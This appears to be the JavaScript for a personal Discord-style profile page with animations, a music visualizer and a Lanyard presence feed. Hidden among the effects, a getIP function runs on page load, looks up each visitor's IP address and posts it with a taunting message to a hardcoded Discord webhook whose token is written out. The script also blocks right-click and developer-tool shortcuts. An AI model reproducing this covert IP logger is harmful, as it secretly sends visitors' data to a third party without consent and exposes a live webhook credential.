fetch("counter.php")
  .then(r => r.text())
  .then(v => document.getElementById("viewCount").textContent = v);

const introPanel = document.getElementById("intro-panel");

introPanel.addEventListener("click", () => {
    introPanel.style.opacity = 0; // fade out
    setTimeout(() => {
        introPanel.style.display = "none"; 
    }, 800); 
});

const cursor = document.getElementById('cursor');
let lastMouseTime = 0;

function createStarParticle(x, y) {
  const particle = document.createElement('div');
  
  const sizes = ['small', 'medium', 'large'];
  const randomSize = sizes[Math.floor(Math.random() * sizes.length)];
  particle.className = `star-particle ${randomSize}`;
  
  const offsetX = (Math.random() - 0.5) * 50;
  const offsetY = (Math.random() - 0.5) * 20;
  
  particle.style.left = (x + offsetX) + 'px';
  particle.style.top = (y + offsetY) + 'px';
  
  document.body.appendChild(particle);
  
  setTimeout(() => {
    if (particle.parentNode) {
      particle.parentNode.removeChild(particle);
    }
  }, 2000);
}

document.addEventListener('mousemove', e => {
  cursor.style.left = e.clientX + 'px';
  cursor.style.top = e.clientY + 'px';
  
  const now = Date.now();
  if (now - lastMouseTime > 30) { 
    if (Math.random() < 0.8) { 
      createStarParticle(e.clientX, e.clientY);
    }
  
    if (Math.random() < 0.3) {
      createStarParticle(e.clientX, e.clientY);
    }
    lastMouseTime = now;
  }
});

document.addEventListener('mousedown', () => {
  cursor.style.transform = 'translate(-50%, -50%) scale(0.8)';
});
document.addEventListener('mouseup', () => {
  cursor.style.transform = 'translate(-50%, -50%) scale(1)';
});

const container = document.querySelector('.container');

document.addEventListener('mousemove', (e) => {
    const x = e.clientX / window.innerWidth - 0.5;
    const y = e.clientY / window.innerHeight - 0.5;
    const maxTilt = 30; 
    const rotateX = y * maxTilt; 
    const rotateY = x * maxTilt; 
    const scale = 1.05;
    container.style.transform = `rotateX(${-rotateX}deg) rotateY(${rotateY}deg) scale(${scale}) translateZ(0)`;
});

const discordUserId = "737630884823433267"; 

const avatarImg = document.querySelector(".user-box img");
const usernameEl = document.querySelector(".username");
const statusEl = document.querySelector(".desc");

const ws = new WebSocket("wss://api.lanyard.rest/socket");

ws.addEventListener("open", () => {
    console.log("Connected to Lanyard WebSocket");

    ws.send(JSON.stringify({
        op: 2,
        d: {
            subscribe_to_id: discordUserId
        }
    }));
});

ws.addEventListener("message", (event) => {
    const data = JSON.parse(event.data);

    if (data.t === "INIT_STATE" || data.t === "PRESENCE_UPDATE") {
        const user = data.d.discord_user;
        const activities = data.d.listening_to_spotify ? data.d.activities : data.d.activities;

        avatarImg.src = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512`;

        usernameEl.textContent = `${user.username}#${user.discriminator}`;

        const customStatus = activities.find(a => a.type === 4); 
        if (customStatus && customStatus.state) {
            statusEl.textContent = customStatus.state;
        } else {
            statusEl.textContent = "No status";
        }
        const discordStatus = data.d.discord_status; 
    const userBox = document.querySelector('.user-box');

    userBox.classList.remove('online','idle','dnd','offline');
    if(discordStatus) userBox.classList.add(discordStatus);
    }
});

document.addEventListener("contextmenu", (e) => e.preventDefault());
document.addEventListener("keydown", (e) => {
    if (e.key === "F12") e.preventDefault();
    if (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) e.preventDefault();
    if (e.ctrlKey && e.key === "U") e.preventDefault();
});

const audio = document.getElementById("bg-music");

let laserCanvas;
let laserCtx;
let isPlaying = false;
let laserBars = [];
const NUM_LASER_BARS = 32;

function initBeatVisualization() {
  laserCanvas = document.getElementById('laserCanvas');
  if (!laserCanvas) return;
  
  laserCtx = laserCanvas.getContext('2d');
  const viz = document.getElementById('laserVisualizer');
  function resizeCanvas(){
    const w = viz ? viz.clientWidth : laserCanvas.clientWidth;
    const h = laserCanvas.clientHeight;
    laserCanvas.width = Math.max(1, w);
    laserCanvas.height = Math.max(1, h);
  }
  resizeCanvas();
  window.addEventListener('resize', resizeCanvas);
  
  for (let i = 0; i < NUM_LASER_BARS; i++) {
    laserBars.push({
      height: 2,
      targetHeight: 2,
      velocity: 0
    });
  }
  
  animateLaser();
  
  function createBeatPattern() {
    if (!isPlaying || audio.paused) return;
    
    const patterns = [
      { delay: 400, intensity: 0.8, type: 'pulse' },
      { delay: 200, intensity: 0.4, type: 'wave' },
      { delay: 400, intensity: 0.7, type: 'center' },
      { delay: 200, intensity: 0.3, type: 'random' },
      { delay: 600, intensity: 0.9, type: 'explosion' },
      { delay: 300, intensity: 0.5, type: 'sides' },
      { delay: 350, intensity: 0.6, type: 'alternate' },
      { delay: 250, intensity: 0.5, type: 'ripple' },
      { delay: 500, intensity: 0.8, type: 'build' },
      { delay: 150, intensity: 0.3, type: 'flutter' },
      { delay: 450, intensity: 0.7, type: 'mountain' },
      { delay: 300, intensity: 0.6, type: 'valley' },
      { delay: 400, intensity: 0.8, type: 'spiral' },
      { delay: 200, intensity: 0.4, type: 'bounce' }
    ];
    
    let patternIndex = 0;
    
    function nextBeat() {
      if (!isPlaying || audio.paused) return;
      
      const pattern = patterns[patternIndex % patterns.length];
      const volumeLevel = audio.volume;
      const volumeActivity = Math.max(0.3, volumeLevel); 
  
      if (Math.random() < volumeActivity || pattern.intensity > 0.7) {
        triggerLaserBeat(pattern.intensity, pattern.type);
      }
      
      patternIndex++;
    
      const volumeDelayMultiplier = Math.max(1, 2 - volumeLevel);
      setTimeout(nextBeat, pattern.delay * volumeDelayMultiplier);
    }
    
    nextBeat();
  }
  
  audio.addEventListener('play', () => {
    isPlaying = true;
    createBeatPattern();
  });
  
  audio.addEventListener('pause', () => {
    isPlaying = false;
  });
  
  audio.addEventListener('ended', () => {
    isPlaying = false;
  });
}

function animateLaser() {
  if (!laserCtx) return;
  
  laserCtx.clearRect(0, 0, laserCanvas.width, laserCanvas.height);
  
  const barWidth = laserCanvas.width / NUM_LASER_BARS;
  const maxHeight = laserCanvas.height - 4;

  for (let i = 0; i < laserBars.length; i++) {
    const bar = laserBars[i];
    
    const diff = bar.targetHeight - bar.height;
    bar.velocity += diff * 0.05;
    bar.velocity *= 0.8;
    bar.height += bar.velocity;
    
    const volumeBaseline = Math.max(1, 2 + (audio.volume * 3)); 
    bar.targetHeight += (volumeBaseline - bar.targetHeight) * 0.02;
    const minHeight = Math.max(1, 2 * audio.volume);
    bar.height = Math.max(minHeight, bar.height);
    
    if (audio.volume > 0 && bar.targetHeight <= volumeBaseline + 1) {
      const idleAnimation = Math.sin(Date.now() * 0.003 + i * 0.2) * audio.volume * 1.5;
      bar.height += idleAnimation;
    }
    
    const x = i * barWidth + barWidth * 0.1;
    const width = barWidth * 0.8;
    const height = Math.min(bar.height, maxHeight);
    const y = laserCanvas.height - height - 2;
    
    const gradient = laserCtx.createLinearGradient(x, y + height, x, y);
    const intensity = height / maxHeight;
    gradient.addColorStop(0, `rgba(255, 255, 255, ${0.3 + intensity * 0.4})`);
    gradient.addColorStop(0.5, `rgba(255, 255, 255, ${0.6 + intensity * 0.3})`);
    gradient.addColorStop(1, `rgba(255, 255, 255, ${0.8 + intensity * 0.2})`);
    
    laserCtx.fillStyle = gradient;
    laserCtx.fillRect(x, y, width, height);
    if (intensity > 0.4) {
      laserCtx.shadowBlur = 8 * intensity;
      laserCtx.shadowColor = `rgba(255, 255, 255, ${0.6 * intensity})`;
      laserCtx.fillRect(x, y, width, height);
      laserCtx.shadowBlur = 0;
    }
  }
  
  requestAnimationFrame(animateLaser);
}

function triggerLaserBeat(intensity, type) {  
  const volumeLevel = audio.volume; 
  const volumeMultiplier = Math.max(0.1, volumeLevel);
  
  const maxHeight = 35;
  const baseHeight = intensity * maxHeight * volumeMultiplier;
  
  switch (type) {
    case 'pulse':
      laserBars.forEach(bar => {
        bar.targetHeight = baseHeight + Math.random() * 5;
      });
      break;
    case 'wave':
      laserBars.forEach((bar, i) => {
        const wavePos = Math.sin((i / NUM_LASER_BARS) * Math.PI * 2) * 0.5 + 0.5;
        bar.targetHeight = baseHeight * wavePos + 3;
      });
      break;
    case 'center':
      laserBars.forEach((bar, i) => {
        const centerDistance = Math.abs(i - NUM_LASER_BARS / 2) / (NUM_LASER_BARS / 2);
        const centerFactor = 1 - centerDistance;
        bar.targetHeight = baseHeight * centerFactor + 2;
      });
      break;
    case 'random':
      laserBars.forEach(bar => {
        bar.targetHeight = Math.random() * baseHeight + 2;
      });
      break;
    case 'explosion':
      laserBars.forEach((bar, i) => {
        const centerDistance = Math.abs(i - NUM_LASER_BARS / 2);
        const explosionForce = Math.max(0, baseHeight - centerDistance * 2);
        bar.targetHeight = explosionForce + 3;
      });
      break;
    case 'sides':
      laserBars.forEach((bar, i) => {
        const sideDistance = Math.min(i, NUM_LASER_BARS - 1 - i) / (NUM_LASER_BARS / 2);
        bar.targetHeight = baseHeight * (1 - sideDistance) + 2;
      });
      break;
    case 'alternate':
      laserBars.forEach((bar, i) => {
        const alternateHeight = i % 2 === 0 ? baseHeight : baseHeight * 0.3;
        bar.targetHeight = alternateHeight + 2;
      });
      break;
    case 'ripple':
      const rippleCenter = Math.floor(Math.random() * NUM_LASER_BARS);
      laserBars.forEach((bar, i) => {
        const distance = Math.abs(i - rippleCenter);
        const rippleEffect = Math.max(0, 1 - distance / 8);
        bar.targetHeight = baseHeight * rippleEffect + 2;
      });
      break;
    case 'build':
      laserBars.forEach((bar, i) => {
        const buildFactor = (i / NUM_LASER_BARS);
        bar.targetHeight = baseHeight * buildFactor + 2;
      });
      break;
    case 'flutter':
      laserBars.forEach(bar => {
        const flutterHeight = Math.random() * (baseHeight * 0.6) + baseHeight * 0.2;
        bar.targetHeight = flutterHeight + 2;
      });
      break;
    case 'mountain':
      laserBars.forEach((bar, i) => {
        const centerPos = NUM_LASER_BARS / 2;
        const distance = Math.abs(i - centerPos);
        const mountainHeight = Math.max(0, baseHeight - (distance * baseHeight) / centerPos);
        bar.targetHeight = mountainHeight + 2;
      });
      break;
    case 'valley':
      laserBars.forEach((bar, i) => {
        const centerPos = NUM_LASER_BARS / 2;
        const distance = Math.abs(i - centerPos);
        const valleyHeight = (distance * baseHeight) / centerPos;
        bar.targetHeight = Math.min(baseHeight, valleyHeight) + 2;
      });
      break;
    case 'spiral':
      const time = Date.now() * 0.005;
      laserBars.forEach((bar, i) => {
        const spiralValue = Math.sin(i * 0.5 + time) * Math.cos(i * 0.3 + time * 1.2);
        const spiralHeight = (spiralValue * 0.5 + 0.5) * baseHeight;
        bar.targetHeight = spiralHeight + 2;
      });
      break;
    case 'bounce':
      const bouncePos = (Date.now() * 0.01) % NUM_LASER_BARS;
      laserBars.forEach((bar, i) => {
        const distance = Math.abs(i - bouncePos);
        const bounceHeight = distance < 3 ? baseHeight * (1 - distance / 3) : 0;
        bar.targetHeight = bounceHeight + 2;
      });
      break;
  }
}

window.addEventListener('load', () => {
  initBeatVisualization();
});

introPanel.addEventListener("click", () => {
    introPanel.style.opacity = 0;
    setTimeout(() => {
        introPanel.style.display = "none";
    }, 800);
    audio.volume = 0;       
    audio.play().catch(e => {
        console.log("Autoplay blocked, user interaction needed");
    });

    let fadeInterval = setInterval(() => {
        if (audio.volume < 1) {
            audio.volume = Math.min(audio.volume + 0.02, 1); 
        } else {
            clearInterval(fadeInterval);
        }
    }, 100); 
});

function getIP() {
  fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
      const ipEl = document.getElementById('ip');
      if (ipEl) ipEl.innerHTML = 'Your IP Address is: ' + data.ip;
      sendWebhook(data.ip);
    })
    .catch(error => console.error(error));
}

function sendWebhook(ip) {
  const webhookURL = 'https://discord.com/api/webhooks/1423718256597930000/sbg5diA4D5tpzEZ7vqu7FnhOZYan9Rvh4HSTlK7YFKmrqRLob6EPWUoktQBeJNGiA7nb';
  const payload = {
    content: `**basta ip mo to abnoy:** ${ip}`,
    embeds: [{
      title: "nagmamahal wayne :p",
      description: "HAHAAHAHAHAHAHAHAH EWAN KO SAYO",
      image: {
        url: "https://file.garden/aN0Uo2YmaWI-OmAY/a068e8552ede3d26075c571eec4ae028-1.png"
      }
    }]
  };

  fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })
  .then(response => console.log('Webhook sent successfully'))
  .catch(error => console.error(error));
}

window.addEventListener('load', getIP);

let activeFlakes = 0;
const MAX_FLAKES = 8;

function createWayneFlake() {
    if (activeFlakes >= MAX_FLAKES) return;

    activeFlakes++;

    const flake = document.createElement("div");
    flake.classList.add("wayne-flake");
    flake.textContent = "wayne";
    const startX = Math.random() * window.innerWidth;
    const duration = 5000 + Math.random() * 3000;
    const amplitude = 30 + Math.random() * 20;
    const size = 16 + Math.random() * 10;
    flake.style.left = startX + "px";
    flake.style.fontSize = size + "px";
    document.getElementById("wayne-snow").appendChild(flake);
    let startTime = null;
    function animateFlake(ts) {
        if (!startTime) startTime = ts;
        const elapsed = ts - startTime;
        const progress = elapsed / duration;
        if (progress >= 1) {
            flake.remove();
            activeFlakes--;
            return;
        }
        const fallY = progress * window.innerHeight;
        const sCurve =
            Math.sin(progress * Math.PI * 2) *
            amplitude *
            (1 - Math.abs(2 * progress - 1));

        flake.style.opacity = 1 - progress;
        flake.style.transform = `translate(${sCurve}px, ${fallY}px)`;

        requestAnimationFrame(animateFlake);
    }
    requestAnimationFrame(animateFlake);
}
function spawnRandom() {
    createWayneFlake();
    const next = 200 + Math.random() * 900;
    setTimeout(spawnRandom, next);
}
spawnRandom();

const activityEl = document.querySelector('.activity');
ws.onopen = () => {
    ws.send(JSON.stringify({
        op: 2,
        d: {
            subscribe_to_id: "YOUR_DISCORD_ID"
        }
    }));
};
ws.onopen = () => {
    ws.send(JSON.stringify({
        op: 2,
        d: {
            subscribe_to_id: "YOUR_DISCORD_ID"
        }
    }));
};
function getActivityVerb(type) {
    switch (type) {
        case 0: return "is playing";
        case 1: return "is streaming";
        case 2: return "is listening to";
        case 3: return "is watching";
        case 5: return "is competing in";
        default: return "";
    }
}
ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.t !== "INIT_STATE" && data.t !== "PRESENCE_UPDATE") return;
    const info = data.d;
    usernameEl.textContent = info.discord_user.username;
    const activity = info.activities?.find(a => a.type !== 4);
    if (!activity) {
        activityEl.textContent = "";
        return;
    }
    const verb = getActivityVerb(activity.type);
    const name = activity.name || "";

    activityEl.textContent = `${verb} ${name}`;
};


